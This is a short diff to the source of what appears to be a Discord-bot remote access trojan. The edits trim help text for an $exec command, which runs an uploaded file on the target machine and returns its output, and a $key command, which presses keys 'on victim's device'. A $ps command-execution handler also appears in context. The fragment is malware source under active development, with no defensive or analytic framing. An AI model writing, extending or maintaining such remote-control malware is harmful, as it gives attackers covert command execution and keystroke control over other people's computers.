@@ -764,7 +764,7 @@ async def ps(ctx, *, command: str = None):
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
-@bot.command(name="exec", help="Runs attached file and returns console output, format $exec [args]", usage="$exec [args]")
+@bot.command(name="exec", help="Runs attached file and returns console output", usage="$exec [args]")
 async def exec_attachment(ctx: commands.Context, *, args: str = ""):
     if not ctx.message.attachments or len(ctx.message.attachments) != 1:
         await ctx.send("Attach exactly one file.")
@@ -1655,7 +1655,7 @@ async def hotkey(ctx, *, keys=None):
     except Exception as e:
         await ctx.send(f"Error: `{e}`")
 
-@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg", usage="$key <up|down|press|hotkey (button+button)> <key(s)>")
+@bot.command(help="Press a key/hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg", usage="$key <up|down|press|hotkey (button+button)> <key(s)>")
 async def key(ctx, func: str = "", value: str = ""):
     if not func:
         await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
